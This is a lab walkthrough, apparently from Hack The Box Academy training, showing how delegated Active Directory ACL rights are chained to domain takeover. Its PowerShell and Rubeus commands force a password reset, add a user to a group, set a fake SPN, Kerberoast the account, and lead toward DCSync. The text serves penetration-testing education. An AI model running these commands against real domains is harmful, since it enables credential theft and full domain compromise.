**We are chaining small, delegated Active Directory permissions to reach full domain compromise.**

Not by exploiting a bug —  
but by **abusing how AD permissions (ACLs) are configured**.

This entire section of the guide is about proving one key lesson:

##### What Enumeration Revealed (The Critical Insight)

Through ACL enumeration, we discovered:

1. **`wley` can reset the password of `damundsen`**
2. **`damundsen` can be added to “Help Desk Level 1”**
3. **“Help Desk Level 1” is nested into “Information Technology”**
4. **“Information Technology” has `GenericAll/GenericWrite` over `adunn`**
5. **`adunn` can perform DCSync**


A Simple overview :

> Reset password → add group → inherit nested rights → write SPN → Kerberoast → crack → domain takeover


---

Inside our Student VM, We create credential object for user `wley`

> We got `wley` user credentials from previous [ntlm relay](https://academy.hackthebox.com/module/143/section/1274) part

```
$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
```

```
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

After that we can use `wley` to `ForceChangePassword` user `damundsen`

```
$damundsenPassword = ConvertTo-SecureString 'NewSecurePass@1' -AsPlainText -Force

Set-DomainUserPassword `
-Identity damundsen `
-AccountPassword $damundsenPassword `
-Credential $Cred `
-Verbose
```

Authenticate as `damundsen`

```
runas /user:INLANEFREIGHT\damundsen powershell
```

As we done to the `wley` user here also we will create credential Object for `damundsen`

> This part from nowon will be done inside damundsen shell

```
$SecPassword = ConvertTo-SecureString 'NewSecurePass@1' -AsPlainText -Force
```

```
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```

Add `damundsen` to “Help Desk Level 1”

```
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

Check if it's successfully added our user 
```
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

Confirm Nested Privilege Path

```
Get-DomainGroup "Help Desk Level 1" | Select MemberOf
```

The result shows
```
Information Technology
```

Abuse GenericWrite / GenericAll on `adunn`

```
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

Verify the fake SPN
```
Get-DomainUser adunn -Properties serviceprincipalname
```

Now we can Kerberoast `adunn`

```
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

At last we can crack the hash using hashcat or John



### (Post-Exploitation) Authenticate as `adunn`

Run as adunn with found password

>`adunn` can perform **DCSync**

```
runas /user:INLANEFREIGHT\adunn powershell
```

